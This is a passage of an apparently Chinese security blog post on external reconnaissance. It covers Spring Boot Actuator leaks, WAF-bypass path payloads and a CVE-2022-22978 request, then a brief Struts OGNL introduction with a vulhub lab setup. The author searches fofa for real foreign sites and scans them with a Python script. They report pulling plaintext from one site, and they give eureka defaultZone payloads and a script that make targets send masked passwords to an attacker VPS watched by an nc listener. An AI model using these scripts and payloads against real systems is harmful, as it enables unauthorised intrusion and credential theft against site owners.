+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#系统管理员可能将端点直接暴露在站点根目录下</span><br><span class="line">GET /env HTTP/2</span><br><span class="line">#Actuator 也可能存在于子目录中</span><br><span class="line">GET /att-admin/env HTTP/2</span><br><span class="line">GET /att-admin/actuator/env HTTP/2</span><br><span class="line">GET /att-admin/info/env HTTP/2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过特殊HTTP头访问actuator</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Original-URL: /avtuator/env</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问mappings端点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/mappings HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>访问这个端点很可能暴露出一些路由，去尝试访问就行</p>
+<p>如果mappings不可用的话，可以检查metrics端点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/metrics HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>它会返回可在后续请求中查询的指标名称列表:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;names&quot;:[&quot;application.ready.time&quot;,&quot;application.started.time&quot;,&quot;disk.free&quot;,&quot;disk.total&quot;,&quot;executor.active&quot;,&quot;executor.completed&quot;,&quot;executor.pool.core&quot;,&quot;executor.pool.max&quot;,&quot;executor.pool.size&quot;,&quot;executor.queue.remaining&quot;,&quot;executor.queued&quot;,&quot;http.client.requests&quot;,&quot;http.client.requests.active&quot;,&quot;http.server.requests&quot;,&quot;http.server.requests.active&quot;,&quot;jvm.buffer.count&quot;,&quot;jvm.buffer.memory.used&quot;,&quot;jvm.buffer.total.capacity&quot;,&quot;jvm.classes.loaded&quot;,&quot;jvm.classes.unloaded&quot;,&quot;jvm.compilation.time&quot;,&quot;jvm.gc.live.data.size&quot;,&quot;jvm.gc.max.data.size&quot;,&quot;jvm.gc.memory.allocated&quot;,&quot;jvm.gc.memory.promoted&quot;,&quot;jvm.gc.overhead&quot;,&quot;jvm.gc.pause&quot;,&quot;jvm.info&quot;,&quot;jvm.memory.committed&quot;,&quot;jvm.memory.max&quot;,&quot;jvm.memory.usage.after.gc&quot;,&quot;jvm.memory.used&quot;,&quot;jvm.threads.daemon&quot;,&quot;jvm.threads.live&quot;,&quot;jvm.threads.peak&quot;,&quot;jvm.threads.started&quot;,&quot;jvm.threads.states&quot;,&quot;logback.events&quot;,&quot;process.cpu.time&quot;,&quot;process.cpu.usage&quot;,&quot;process.files.max&quot;,&quot;process.files.open&quot;,&quot;process.start.time&quot;,&quot;process.uptime&quot;,&quot;spring.cloud.gateway.requests&quot;,&quot;spring.cloud.gateway.routes.count&quot;,&quot;system.cpu.count&quot;,&quot;system.cpu.usage&quot;,&quot;system.load.average.1m&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中大部分是普通的元数据，值得关注的有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#利用这个字段产生的值尝试 vhost Fuzz 可能会有收获。这些主机名在 SSRF 场景中也非常有价值</span><br><span class="line">spring.cloud.gateway.requests</span><br><span class="line">#本质上是 mappings的低精度替代——信息量较少但仍然有用。从这里开始测试发现的路由即可</span><br><span class="line">http.server.requests</span><br><span class="line">#其含义与其他 metrics 类似。这些指标提供了有用的信息，能间接引导你继续深入</span><br><span class="line">http.client.requests</span><br></pre></td></tr></table></figure>
+
+<p>使用方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/metrics/&#123;metric-name&#125; HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>查询后 (精简输出) 可以揭示服务器或客户端最近发送或接收的请求</p>
+</li>
+<li><p>路径遍历与绕过</p>
+<p>一般来说，简单和双重 URL 编码有时能帮助访问”被屏蔽”的 Actuator 端点</p>
+<p>上述引用文章也引用了<a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf%E8%BF%99%E4%B8%AA%E5%8F%AB%E5%81%9AOrange">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf这个叫做Orange</a> Tsai大佬的描述，通常表示为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /..;/actuator/env HTTP/2</span><br><span class="line">GET /static../actuator/env HTTP/2</span><br><span class="line">GET /actuator/health/..;/env HTTP/2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>替代方案：使用”;”绕过</p>
+<p>成功的原因通常是不良的重写规则、黑名单或配置错误的规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /;/actuator/env HTTP/2</span><br><span class="line">GET /actuator;/env HTTP/2</span><br><span class="line">GET /actuator/env; HTTP/2</span><br><span class="line">GET /actuator/env;.. HTTP/2</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/12.png" class="" width="12">
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/13.png" class="" width="13">
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/14.png" class="" width="14">
+</li>
+<li><p>通过httptrace端点实现会话接管</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/httptrace HTTP/2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他有用的端点：logfile与gateway</p>
+<p>Actuator经常暴露 <code>gateway/routes</code>端点。如果你有写权限，SSRF 是现实可行的；在旧版Spring Boot中甚至可能导致RCE。logfile端点需要由管理员启用，它返回特定事件的日志。</p>
+</li>
+<li><p>CVE-2022-22978：允许绕过认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/%0Aenv HTTP/1.1</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>在fofa上搜索：<code>body=&quot;Whitelabel Error Page&quot; &amp;&amp; country!=&quot;CN&quot;</code>然后通过python发包探测哪些存在actuator泄露，具体脚本可参考：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">route=<span class="string">&#x27;/actuator/env&#x27;</span></span><br><span class="line">urls=[</span><br><span class="line">    <span class="string">&quot;这里面写你搜索到的第一个url&quot;</span>,</span><br><span class="line">    <span class="string">&quot;第二个&quot;</span>,</span><br><span class="line">    <span class="string">&quot;第三个&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    turl = url + route</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.get(turl,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求：<span class="subst">&#123;turl&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text[:<span class="number">300</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请求失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样你就可以看到类似的页面：</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/15.png" class="" width="15">
+
+<p>我尝试的是具有<code>/avtuator/jolokia/list</code>的网站，所以我尝试了第一种获取明文方法：</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/16.png" class="" width="16">
+
+<p>接下来我再复现另外几种：</p>
+<h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><p>利用条件：</p>
+<p>可以GET请求目标网站的&#x2F;env，可以POST请求目标网站的&#x2F;env，可以POST请求目标网站的&#x2F;refresh接口刷新配置（存在spring-boot-starter-actuator依赖），目标使用了spring-cloud-starter-netflix-eureka-client依赖，目标可以请求攻击者的服务器（请求可出外网），Spring Boot版本大于2.2.4，则必须使用下面的属性手动启用POST API调用，management.endpoint.env.post.enabled&#x3D;true，否则不能通过POST访问env端点。</p>
+<p><strong>利用方法</strong></p>
+<ol>
+<li>首先访问<code>url+/actuator/env</code>来获取我们想要明文字段的key，我这里是<code>sun.java.command</code></li>
+<li>在自己控制的外网服务器上监听80端口<code>nc -lvp80</code></li>
+<li>将下面</li>
+</ol>
+<p><code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code><br><code>security.user.password</code>换成自己想要获取的对应的星号*遮掩的属性名；<br><code>your-vps-ip</code>换成自己外网服务器的真实ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST/actuator/env </span><br><span class="line">Content-Type:application/json </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后刷新配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST/actuator/refresh </span><br><span class="line">Content-Type:application/json</span><br></pre></td></tr></table></figure>
+
+<p>按理来说这里我的监听应该能收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET/apps/HTTP/1.1 </span><br><span class="line">Accept:application/json,application/*+json </span><br><span class="line">Authorization:BasicdmFsdWU6cm9vdA== </span><br></pre></td></tr></table></figure>
+
+<p>类似于这种的请求，然后将Authorization里面的字段base64解码之后就可以查看value，但是我这里没有看到请求，倒是在对方服务器actuator里面看到了……</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/19.png" class="" width="19">
+
+<p>可以看到是6007，好像是利用其出网必须是1.x版本，可惜了。。。。。</p>
+<p>这里ZLARYY在练习使用python呢：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url=<span class="string">&quot;http://受攻击的服务器&quot;</span></span><br><span class="line">route1=<span class="string">&quot;/actuator/env&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://value:$&#123;server.port&#125;@你的公网ip:8888/eureka/&quot;</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">r1=requests.post(base_url+route1,json=data,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.status_code)</span><br><span class="line"><span class="built_in">print</span>(r1.text[:<span class="number">300</span>])</span><br><span class="line">route2=<span class="string">&quot;/actuator/refresh&quot;</span></span><br><span class="line">r2=requests.post(base_url+route2,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(r2.status_code)</span><br><span class="line"><span class="built_in">print</span>(r2.text[:<span class="number">300</span>])</span><br></pre></td></tr></table></figure>
+
+<p>另一种方法与这一种类似，只是包不一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST/actuator/env</span><br><span class="line">Content-Type:application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后还是进行刷新配置，再查看VPS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST/actuator/refresh </span><br><span class="line">Content-Type:application/json</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ncat:Connectionfrom****** </span><br><span class="line">GET/SecretKe/apps/HTTP/1.1 </span><br><span class="line">Accept:application/json,application/*+json </span><br><span class="line">Host:****** </span><br><span class="line">Connection:Keep-Alive</span><br><span class="line">User-Agent:Apache-HttpClient/4.5.13(Java/1.8.0_191)</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br></pre></td></tr></table></figure>
+
+<p>apps前面的路径就是需要的数据</p>
+<h1 id="struts"><a href="#struts" class="headerlink" title="struts"></a>struts</h1><p>学习struts相关漏洞之前先学习一下什么是OGNL吧</p>
+<h2 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hgschool/p/17035322.html">Struts2系列漏洞复现汇总-持续更新中 - 小阿辉谈安全 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mooyuan/article/details/151193133">Struts2_S2-045漏洞复现：原理详解+环境搭建+渗透实践(CVE-2017-5638)-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/283821.html">Struts2框架漏洞总结与复现 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cenyu/p/6233942.html">Ognl表达式基本原理和使用方法 - 洋葱源码 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45074341/article/details/139627533">一文全解：OGNL表达式以及Mybatis中的OGNL表达式-CSDN博客</a></p>
+<p><strong>Object Graphic Navigation Language</strong>，是一种表达式语言，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性，OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。</p>
+<p><strong>基本语法：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.property.property...</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>object</code>是要访问的对象，<code>.</code>适用于分隔对象和属性的符号，<code>property</code>是对象的属性名。OGNL表达式可以连续使用<code>.</code>来访问对象的嵌套属性</p>
+<p>例如：假设有一个<code>ZLARYY</code>对象，其中包含一个<code>Friends</code>对象，可以使用OGNL表达式<code>ZLARYY.Friends.Su@sU</code>来访问<code>Friends</code>对象中的<code>Su@sU</code>属性</p>
+<p>OGNL表达式除了基本的属性访问之外，还提供了许多高级特性，如：</p>
+<ul>
+<li><strong>方法调用</strong>：可以使用<code>()</code>符号来调用对象的方法，如<code>Person.getAge()</code></li>
+<li><strong>数组和集合访问</strong>：可以使用<code>[]</code>符号来访问数组和集合中的元素，如：<code>persons[0].name</code>、<code>Person.&#123;name&#125;</code></li>
+<li><strong>条件表达式</strong>：可以使用<code>?:</code>符号来实现条件表达式，如<code>Person.age &gt; 18 ? &#39;成年&#39; : &#39;未成年&#39;</code></li>
+<li><strong>循环和迭代</strong>：可以使用<code>&#123;</code>和<code>&#125;</code>符号来实现循环和迭代，如<code>&#123;0..10&#125;</code>、<code>&#123;Persons.name&#125;</code></li>
+</ul>
+<p>开发者喜欢配合spring、hibernat用，称为SSH</p>
+<p>接下来跟着<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hgschool/p/17035322.html">Struts2系列漏洞复现汇总-持续更新中 - 小阿辉谈安全 - 博客园</a>复现漏洞！！！</p>
+<h2 id="S2-001复现（CVE-2007-4556）"><a href="#S2-001复现（CVE-2007-4556）" class="headerlink" title="S2-001复现（CVE-2007-4556）"></a>S2-001复现（CVE-2007-4556）</h2><p>它是Apache Struts2历史上第一个被公开的OGNL注入漏洞，这个漏洞产生的根本原因在于Struts2早期版本（2.0.0-2.0.8）处理表单验证失败时的逻辑缺陷，在一个典型的web登录或注册场景中，如果用户填写的表单数据没有通过验证（比如密码太短、用户名包含非法字符），后端通常会将用户打回原表单页面，并且把刚才用户输入的内容回显在输入框里面</p>
+<p>为了实现这个动态回显功能，struts2默认开启了一个名为<code>altSynax</code>的特性，当表单验证失败需要重绘页面时，框架<strong>会将输入框的值作为OGNL表达式进行递归解析</strong></p>
+<p>这时候如果用户利用OGNL的语法特征，使用<code>%&#123;&#125;</code>将输入包裹起来，Struts2就会认为这是一段代码并执行它，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设你再用户名输入框里面填入：%&#123;2+2&#125;</span><br><span class="line">当表单验证失败并重新加载后，就会发现输入框里面的内容变成了：4</span><br><span class="line">这就证明服务器将用户的输入当成OGNL代码执行了</span><br></pre></td></tr></table></figure>
+
+<p>因为OGNL具备强大的Java底层调用能力，攻击者可以直接将数学运算替换为系统命令</p>
+<p>接下来我们尝试尝试搭建一个本地具有S2-001漏洞的环境吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在kali Linux里面：</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/struts2/s2-001</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/">https://zlaryy123.github.io/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">信息搜集</div></div><div class="info-2"><div class="info-item-1">信息搜集Google HackingGoogle Hacking（也常被称为Google Dorking）是一种利用搜索引擎（特别是Google）的高级搜索操作符来发现隐藏在公共互联网上的敏感信息、漏洞或配置错误的攻击或信息收集技术。 高级搜索操作符参考：https://zhuanlan.zhihu.com/p/400365865 site用于限制搜索范围，只在特定的域名或网站内进行搜索 12site:example.com#只在example.com及其子域名下搜索    filetype和exp用于指定文件类型，只搜索具有特定扩展名的文件 123site:baidu.com filetype:pdfsite:baidu.com ext:pdf#表示查找在baidu.com站点上文件类型为pdf的网页    intitle和allintitle用于限制网页标题，只搜索网页标题中带有特定词语的页面 12intitle:百度#只返回标题中包含百度的网页    这里需要提一下intile和allintitle的区别： 123456intitle:百度 登录#表示搜索标题中包含百度的网...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%E2%80%A6%E2%80%A6%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">常规外网打点（持续更新中……）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spring-boot"><span class="toc-number">2.</span> <span class="toc-text">spring-boot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#actuator%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text">actuator泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.x版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.x版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#heapdump"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">heapdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jolokia"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">jolokia</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">绕过waf的一些相关方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VPS"><span class="toc-number">2.2.1.</span> <span class="toc-text">VPS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struts"><span class="toc-number">3.</span> <span class="toc-text">struts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL"><span class="toc-number">3.1.</span> <span class="toc-text">OGNL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-001%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2007-4556%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">S2-001复现（CVE-2007-4556）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/" title="常规外网打点">常规外网打点</a><time datetime="2026-05-19T13:00:00.000Z" title="Created 2026-05-19 21:00:00">2026-05-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集">信息搜集</a><time datetime="2026-04-23T06:50:00.000Z" title="Created 2026-04-23 14:50:00">2026-04-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="SSTI模板注入">SSTI模板注入</a><time datetime="2026-04-11T12:50:00.000Z" title="Created 2026-04-11 20:50:00">2026-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/07/XXE/" title="XXE">XXE</a><time datetime="2026-04-07T13:45:00.000Z" title="Created 2026-04-07 21:45:00">2026-04-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/02/flask%20session%E4%BC%AA%E9%80%A0%E4%B8%8Efilter-chain/" title="flask的session伪造与filter-chain">flask的session伪造与filter-chain</a><time datetime="2026-04-02T08:00:00.000Z" title="Created 2026-04-02 16:00:00">2026-04-02</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span><span class="footer-beian"><a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">蜀ICP备2026016552号-1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async data-pjax 